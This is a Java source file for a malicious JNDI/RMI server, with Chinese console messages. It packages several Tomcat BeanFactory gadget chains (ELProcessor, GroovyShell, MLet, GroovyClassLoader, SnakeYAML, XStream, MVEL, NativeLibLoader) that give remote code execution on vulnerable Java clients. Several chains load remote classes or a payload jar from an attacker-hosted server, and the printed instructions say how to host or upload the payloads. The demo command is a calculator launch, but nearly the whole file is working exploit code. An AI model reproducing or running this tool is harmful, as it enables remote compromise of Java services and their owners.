import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;

public class RMIServer {
    private static ResourceRef eLProcessor(){
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
        System.out.println("请检查当前项目是否存在javax.el.ELProcessor#eval");
        return ref;
    }

    private static ResourceRef groovyShell(){
        ResourceRef ref = new ResourceRef("\"groovy.bugs.Autobox.Util.printByte(\\\"1\\\", Byte.valueOf((byte)1));\"", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=evaluate"));
//        ref.add(new StringRefAddr("x", "Runtime.getRuntime().exec(\"calc\");"));
        ref.add(new StringRefAddr("x", "groovy.bugs.Autobox.Util.printByte(\"1\", Byte.valueOf((byte)1));"));
        System.out.println("请检查当前项目是否存在groovy.lang.GroovyShell#evaluate");
        return ref;
    }

    private static ResourceRef tomcatMLet() {
        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", "javax.el.ELProcessor"));
        ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
        ref.add(new StringRefAddr("c", "Exploit"));
        System.out.println("请检查当前项目是否存在javax.management.loading.MLet");
        return ref;
    }

    private static ResourceRef tomcatGroovyClassLoader() {
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=addClasspath,b=loadClass"));
        ref.add(new StringRefAddr("a", "http://127.0.0.1/"));
        ref.add(new StringRefAddr("b", "blue"));
        System.out.println("请检查当前项目是否存在groovy.lang.GroovyClassLoader#loadClass");
        System.out.println("在vps的Server服务挂上一个blue.groovy文件,内容如下:");
        System.out.println("@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(\"calc\")})class Person{}");
        return ref;
    }

    private static ResourceRef tomcat_snakeyaml(){
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String yaml = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://127.0.0.1:80/yaml-payload.jar\"]\n" +
                "  ]]\n" +
                "]";
        ref.add(new StringRefAddr("forceString", "a=load"));
        ref.add(new StringRefAddr("a", yaml));
        System.out.println("请检查当前项目是否存在org.yaml.snakeyaml.Yaml#load");
        System.out.println("转到https://github.com/artsploit/yaml-payload 使用项目生产yaml-payload.jar放在http服务端下");
        return ref;
    }

    private static ResourceRef tomcat_xstream(){
        ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <dynamic-proxy>\n" +
                "      <interface>java.lang.Comparable</interface>\n" +
                "      <handler class='sun.tracing.NullProvider'>\n" +
                "        <active>true</active>\n" +
                "        <providerType>java.lang.Comparable</providerType>\n" +
                "        <probes>\n" +
                "          <entry>\n" +
                "            <method>\n" +
                "              <class>java.lang.Comparable</class>\n" +
                "              <name>compareTo</name>\n" +
                "              <parameter-types>\n" +
                "                <class>java.lang.Object</class>\n" +
                "              </parameter-types>\n" +
                "            </method>\n" +
                "            <sun.tracing.dtrace.DTraceProbe>\n" +
                "              <proxy class='java.lang.Runtime'/>\n" +
                "              <implementing__method>\n" +
                "                <class>java.lang.Runtime</class>\n" +
                "                <name>       exec        </name>\n" +
                "                <parameter-types>\n" +
                "                  <class>java.lang.String</class>\n" +
                "                </parameter-types>\n" +
                "              </implementing__method>\n" +
                "            </sun.tracing.dtrace.DTraceProbe>\n" +
                "          </entry>\n" +
                "        </probes>\n" +
                "      </handler>\n" +
                "    </dynamic-proxy>\n" +
                "    <string>calc</string>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";
        ref.add(new StringRefAddr("forceString", "a=fromXML"));
        ref.add(new StringRefAddr("a", xml));
        System.out.println("请检查当前项目是否存在com.thoughtworks.xstream.XStream#fromXML");
        return ref;
    }

    private static ResourceRef tomcat_MVEL(){
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "push Runtime.getRuntime().exec('calc');"));
        System.out.println("请检查当前项目是否存在org.mvel2.sh.ShellSession#exec");
        return ref;
    }

    private static ResourceRef tomcat_loadLibrary(){
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../tmp/libcmd"));
        System.out.println("该漏洞需要结合一个文件上传点上传一个'动态链接库文件',然后通过loadLibrary函数对这个动态链接库文件进行加载进而触发漏洞");
        return ref;
    }

    public static void main(String[] args) throws Exception{
        LocateRegistry.createRegistry(1099);

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(tomcat_snakeyaml());
        Naming.rebind("rmi://0.0.0.0:1099/Exploit",referenceWrapper);
        System.out.println("RMI Server Start Working...");

    }
}